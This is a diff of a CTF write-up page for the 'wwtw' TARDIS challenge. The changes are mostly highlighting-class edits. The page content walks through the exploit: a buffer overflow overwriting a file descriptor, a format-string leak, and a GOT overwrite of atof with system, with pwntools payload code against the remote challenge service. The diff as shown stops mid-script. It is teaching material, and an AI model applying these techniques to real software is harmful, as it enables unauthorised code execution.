@@ -312,7 +312,7 @@ wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606</p>
 <p>32 bit ELF, with <strong>Partial RELRO</strong>, <strong>stack canary found</strong>, <strong>NX</strong> &amp; <strong>PIE</strong> enabled.<br />
 First we’ll have to play a game:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You(^V&lt;&gt;) must find your way to the TARDIS(T) by avoiding the angels(A).
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You(^V&lt;&gt;) must find your way to the TARDIS(T) by avoiding the angels(A).
 Go through the exits(E) to get to the next room and continue your search.
 But, most importantly, don't blink!
    012345678901234567890
@@ -339,16 +339,16 @@ But, most importantly, don't blink!
 Your move (w,a,s,d,q):
 </code></pre></div></div>
 
-<p>We’ll have to control <code class="highlighter-rouge">V</code> with <strong>wasd</strong>, and the goal is to reach the <code class="highlighter-rouge">E</code> without being touched by those <code class="highlighter-rouge">A</code>s. In the final stage, <code class="highlighter-rouge">E</code> will be changed to <code class="highlighter-rouge">T</code>, and we’ll win the game by reaching <code class="highlighter-rouge">T</code>. After we beat the game, it will ask us to input a <code class="highlighter-rouge">TARDIS KEY</code>. At this moment, teammate <strong>yench</strong> started writing a python script to beat the game, while me and other teammates try to figure out what is the <code class="highlighter-rouge">TARDIS KEY</code>.</p>
+<p>We’ll have to control <code class="language-plaintext highlighter-rouge">V</code> with <strong>wasd</strong>, and the goal is to reach the <code class="language-plaintext highlighter-rouge">E</code> without being touched by those <code class="language-plaintext highlighter-rouge">A</code>s. In the final stage, <code class="language-plaintext highlighter-rouge">E</code> will be changed to <code class="language-plaintext highlighter-rouge">T</code>, and we’ll win the game by reaching <code class="language-plaintext highlighter-rouge">T</code>. After we beat the game, it will ask us to input a <code class="language-plaintext highlighter-rouge">TARDIS KEY</code>. At this moment, teammate <strong>yench</strong> started writing a python script to beat the game, while me and other teammates try to figure out what is the <code class="language-plaintext highlighter-rouge">TARDIS KEY</code>.</p>
 
 <p>We found the following C code:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">sub_EB8</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+16h] [bp-12h]@3
-</span>  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+17h] [bp-11h]@9
-</span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@1
-</span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// [sp+1Ch] [bp-Ch]@1
-</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+16h] [bp-12h]@3</span>
+  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+17h] [bp-11h]@9</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@1</span>
+  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// [sp+1Ch] [bp-Ch]@1</span>
+
   <span class="n">v3</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"TARDIS KEY: "</span><span class="p">);</span>
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
@@ -370,9 +370,9 @@ Your move (w,a,s,d,q):
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>So it looks like the <code class="highlighter-rouge">TARDIS KEY</code> is a 10-byte-long string, which every character is the machine code in <code class="highlighter-rouge">sub_EB8()</code>, and the machine code should be an <strong>alpha-numeric character</strong> after it does the <code class="highlighter-rouge">&amp; 0x7F</code> operation. After we dump the machine code and wrote a script to extract the correct byte, we got the <code class="highlighter-rouge">TARDIS KEY</code> = <code class="highlighter-rouge">"UeSlhCAGEp"</code>.</p>
+<p>So it looks like the <code class="language-plaintext highlighter-rouge">TARDIS KEY</code> is a 10-byte-long string, which every character is the machine code in <code class="language-plaintext highlighter-rouge">sub_EB8()</code>, and the machine code should be an <strong>alpha-numeric character</strong> after it does the <code class="language-plaintext highlighter-rouge">&amp; 0x7F</code> operation. After we dump the machine code and wrote a script to extract the correct byte, we got the <code class="language-plaintext highlighter-rouge">TARDIS KEY</code> = <code class="language-plaintext highlighter-rouge">"UeSlhCAGEp"</code>.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARDIS KEY: UeSlhCAGEp
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARDIS KEY: UeSlhCAGEp
 Welcome to the TARDIS!
 Your options are: 
 1. Turn on the console
@@ -382,8 +382,8 @@ Selection:
 
 <p>Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options.</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'3'</span> <span class="p">)</span> <span class="c1">//dword_50B0[0] == our input
-</span> <span class="p">{</span>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'3'</span> <span class="p">)</span> <span class="c1">//dword_50B0[0] == our input</span>
+ <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">unk_50AC</span> <span class="p">)</span>
      <span class="p">{</span>
         <span class="n">choice3</span><span class="p">();</span>
@@ -396,7 +396,7 @@ Selection:
  <span class="p">}</span>
 </code></pre></div></div>
 
-<p>We’ll have to make <code class="highlighter-rouge">unk_50AC</code> = 1. The only way to achieve this is to successfully turn on the TARDIS console:</p>
+<p>We’ll have to make <code class="language-plaintext highlighter-rouge">unk_50AC</code> = 1. The only way to achieve this is to successfully turn on the TARDIS console:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'1'</span> <span class="p">)</span>
  <span class="p">{</span>
@@ -415,7 +415,7 @@ Selection:
  <span class="p">}</span>
 </code></pre></div></div>
 
-<p>The line <code class="highlighter-rouge">LOBYTE(v4) = sub_E08();</code> will do the following checking:</p>
+<p>The line <code class="language-plaintext highlighter-rouge">LOBYTE(v4) = sub_E08();</code> will do the following checking:</p>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">sub_E08</span><span class="p">()</span>
 <span class="p">{</span>
@@ -423,14 +423,14 @@ Selection:
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>and we can only write <code class="highlighter-rouge">dword_50A4</code> in function <code class="highlighter-rouge">sub_BCB()</code>:</p>
+<p>and we can only write <code class="language-plaintext highlighter-rouge">dword_50A4</code> in function <code class="language-plaintext highlighter-rouge">sub_BCB()</code>:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">sub_BCB</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@1
-</span>  <span class="kt">size_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@7
-</span>  <span class="kt">int</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@5
-</span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-Ch]@5
-</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@1</span>
+  <span class="kt">size_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@7</span>
+  <span class="kt">int</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@5</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-Ch]@5</span>
+
   <span class="n">v0</span> <span class="o">=</span> <span class="n">unk_50A8</span><span class="o">++</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;</span> <span class="mh">0xFFFFFFFF</span> <span class="p">)</span>
   <span class="p">{</span>
@@ -444,21 +444,21 @@ Selection:
   <span class="k">else</span>
   <span class="p">{</span>
     <span class="n">write</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">unk_2F4A</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
-    <span class="n">v3</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span> <span class="c1">// here
-</span>    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
-      <span class="n">dword_50A4</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">//here
-</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">alarm</span><span class="p">(</span><span class="mi">2u</span><span class="p">);</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span> <span class="c1">// here</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+      <span class="n">dword_50A4</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">//here</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">alarm</span><span class="p">(</span><span class="mi">2u</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>Notice that <code class="highlighter-rouge">dword_50B0[2]</code> is the <strong>fd</strong>, and <code class="highlighter-rouge">dword_50B0[0]</code> is our <strong>input buffer</strong>(where the program store our <strong>options</strong>). By overflowing <code class="highlighter-rouge">dword_50B0[0]</code>, we can overwrite the value stored in <code class="highlighter-rouge">dword_50B0[2]</code> (the initial value is <strong>3</strong>, we’ll have to overwrite it to <strong>0</strong>(<code class="highlighter-rouge">stdin</code>) so we can write our input into <code class="highlighter-rouge">dword_50A4</code>).</p>
+<p>Notice that <code class="language-plaintext highlighter-rouge">dword_50B0[2]</code> is the <strong>fd</strong>, and <code class="language-plaintext highlighter-rouge">dword_50B0[0]</code> is our <strong>input buffer</strong>(where the program store our <strong>options</strong>). By overflowing <code class="language-plaintext highlighter-rouge">dword_50B0[0]</code>, we can overwrite the value stored in <code class="language-plaintext highlighter-rouge">dword_50B0[2]</code> (the initial value is <strong>3</strong>, we’ll have to overwrite it to <strong>0</strong>(<code class="language-plaintext highlighter-rouge">stdin</code>) so we can write our input into <code class="language-plaintext highlighter-rouge">dword_50A4</code>).</p>
 
 <p>To sum up, here are the steps for enabling the option 3:</p>
 <ol>
-  <li>Overwrite the <strong>fd</strong> (<code class="highlighter-rouge">dword_50B0[2]</code>) into <strong>0</strong> by overflowing <code class="highlighter-rouge">dword_50B0[0]</code></li>
-  <li>Write the value into <code class="highlighter-rouge">dword_50A4</code> so it can pass the checking function <code class="highlighter-rouge">sub_E08()</code>. Notice that <code class="highlighter-rouge">sub_BCB()</code> is called by sending the <code class="highlighter-rouge">SIGALARM</code> signal, so be aware of the timing.</li>
+  <li>Overwrite the <strong>fd</strong> (<code class="language-plaintext highlighter-rouge">dword_50B0[2]</code>) into <strong>0</strong> by overflowing <code class="language-plaintext highlighter-rouge">dword_50B0[0]</code></li>
+  <li>Write the value into <code class="language-plaintext highlighter-rouge">dword_50A4</code> so it can pass the checking function <code class="language-plaintext highlighter-rouge">sub_E08()</code>. Notice that <code class="language-plaintext highlighter-rouge">sub_BCB()</code> is called by sending the <code class="language-plaintext highlighter-rouge">SIGALARM</code> signal, so be aware of the timing.</li>
   <li>Select option <strong>1</strong>, for turning on the TARDIS console.</li>
   <li>Option 3 will be enabled successfully after we turn on a TARDIS console.</li>
 </ol>
@@ -466,16 +466,16 @@ Selection:
 <p>Here’s the payload:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># overwrite fd into stdin</span>
-<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c"># wait for 2 second (until the service call sub_BCB())</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># m+YU = 1431907181</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>    <span class="c"># turn on the TARDIS console</span>
-<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># overwrite fd into stdin
+</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second (until the service call sub_BCB())
+</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
+</span><span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>    <span class="c1"># turn on the TARDIS console
+</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># write the fd back</span>
-<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back
+</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
 <span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
 <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
@@ -484,13 +484,13 @@ Selection:
 <p>After we successfully enable option 3, let’s see what does it do:</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">choice3</span><span class="p">()</span>
 <span class="p">{</span>
-  <span class="kt">double</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST28_8@6
-</span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@9
-</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-424h]@4
-</span>  <span class="kt">double</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-418h]@6
-</span>  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+3Ch] [bp-40Ch]@2
-</span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+43Ch] [bp-Ch]@1
-</span>
+  <span class="kt">double</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST28_8@6</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@9</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-424h]@4</span>
+  <span class="kt">double</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-418h]@6</span>
+  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+3Ch] [bp-40Ch]@2</span>
+  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+43Ch] [bp-Ch]@1</span>
+
   <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
   <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
   <span class="p">{</span>
@@ -498,10 +498,10 @@ Selection:
     <span class="p">{</span>
       <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">);</span>
       <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
-      <span class="k">if</span> <span class="p">(</span> <span class="n">sub_F7E</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">1023</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="c1">// input coordinates
-</span>        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-      <span class="n">nptr</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="sc">','</span><span class="p">);</span> <span class="c1">// split with ','
-</span>      <span class="k">if</span> <span class="p">(</span> <span class="n">nptr</span> <span class="p">)</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">sub_F7E</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">1023</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="c1">// input coordinates</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="n">nptr</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="sc">','</span><span class="p">);</span> <span class="c1">// split with ','</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">nptr</span> <span class="p">)</span>
         <span class="k">break</span><span class="p">;</span>
       <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid coordinates"</span><span class="p">);</span>
     <span class="p">}</span>
@@ -511,8 +511,8 @@ Selection:
     <span class="k">if</span> <span class="p">(</span> <span class="mi">51</span><span class="p">.</span><span class="mi">492137</span> <span class="o">!=</span> <span class="n">v0</span> <span class="o">||</span> <span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="mi">192878</span> <span class="o">!=</span> <span class="n">v3</span> <span class="p">)</span>
       <span class="k">break</span><span class="p">;</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinate "</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span> <span class="c1">// format string vulnerability
-</span>    <span class="n">printf</span><span class="p">(</span><span class="s">" is occupied by another TARDIS.  Materializing there "</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span> <span class="c1">// format string vulnerability</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">" is occupied by another TARDIS.  Materializing there "</span><span class="p">);</span>
     <span class="n">puts</span><span class="p">(</span><span class="s">"would rip a hole in time and space. Choose again."</span><span class="p">);</span>
     <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
   <span class="p">}</span>
@@ -524,14 +524,14 @@ Selection:
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>So it will let us input our coordinates, and check the coordinates’ value. If the coordinates are <strong>(51.492137, -0.192878)</strong>, it will trigger the <strong>format string vulnerability</strong>. After leaking some messages, we found that we’re able to leak the <strong>stack address</strong>. This is very important, since the binary has the <strong>PIE</strong> &amp; <strong>Partial RELRO</strong> protection, we don’t know where the text’s base address is, neither functions’ GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, <strong>and leak the return address to calculate the text’s base address.</strong> After we have the text’s base address, we can <strong>calculate the functions’ GOT address, and leak the function pointer.</strong> After we got all the memory address, we can use the format string vulnerability to overwrite <code class="highlighter-rouge">atof</code>’s GOT entry into <code class="highlighter-rouge">system</code>’s address, and execute our command by entering our commands as the coordinates.</p>
+<p>So it will let us input our coordinates, and check the coordinates’ value. If the coordinates are <strong>(51.492137, -0.192878)</strong>, it will trigger the <strong>format string vulnerability</strong>. After leaking some messages, we found that we’re able to leak the <strong>stack address</strong>. This is very important, since the binary has the <strong>PIE</strong> &amp; <strong>Partial RELRO</strong> protection, we don’t know where the text’s base address is, neither functions’ GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, <strong>and leak the return address to calculate the text’s base address.</strong> After we have the text’s base address, we can <strong>calculate the functions’ GOT address, and leak the function pointer.</strong> After we got all the memory address, we can use the format string vulnerability to overwrite <code class="language-plaintext highlighter-rouge">atof</code>’s GOT entry into <code class="language-plaintext highlighter-rouge">system</code>’s address, and execute our command by entering our commands as the coordinates.</p>
 
 <p>So to sum up:</p>
 <ol>
   <li>Leak the stack address and calculate the return address’ location</li>
   <li>Leak the return address and calculate the text’s base address</li>
-  <li>Calculate <code class="highlighter-rouge">atof</code>’s GOT and leak the function pointer</li>
-  <li>Calculate <code class="highlighter-rouge">system</code>’s address and overwrite <code class="highlighter-rouge">atof</code>’s GOT entry</li>
+  <li>Calculate <code class="language-plaintext highlighter-rouge">atof</code>’s GOT and leak the function pointer</li>
+  <li>Calculate <code class="language-plaintext highlighter-rouge">system</code>’s address and overwrite <code class="language-plaintext highlighter-rouge">atof</code>’s GOT entry</li>
   <li>Input coordinates <strong>“[command], [garbage]”</strong> to execute our commands</li>
 </ol>
 
@@ -578,8 +578,8 @@ Selection:
 
 <span class="n">t</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
 
-<span class="c"># start playing the game</span>
-<span class="k">for</span> <span class="n">test</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+<span class="c1"># start playing the game
+</span><span class="k">for</span> <span class="n">test</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
 	<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
 	<span class="k">if</span> <span class="s">"KEY"</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
 		<span class="k">print</span> <span class="n">s</span>
@@ -620,22 +620,22 @@ Selection:
 	<span class="k">print</span> <span class="n">drct</span>
 	<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">drct</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 
-<span class="c"># Done playing, time to send TARDIS KEY</span>
-
+<span class="c1"># Done playing, time to send TARDIS KEY
+</span>
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending tardis key..."</span><span class="p">)</span>
 <span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"UeSlhCAGEp</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
 <span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c"># wait for 2 second so the service's able to call sub_BCB()</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># m+YU = 1431907181</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># turn on the TARDIS console</span>
-<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second so the service's able to call sub_BCB()
+</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
+</span><span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># turn on the TARDIS console
+</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># write the fd back to 3 so the rest of our input won't get into sub_BCB()</span>
-<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back to 3 so the rest of our input won't get into sub_BCB()
+</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
 <span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
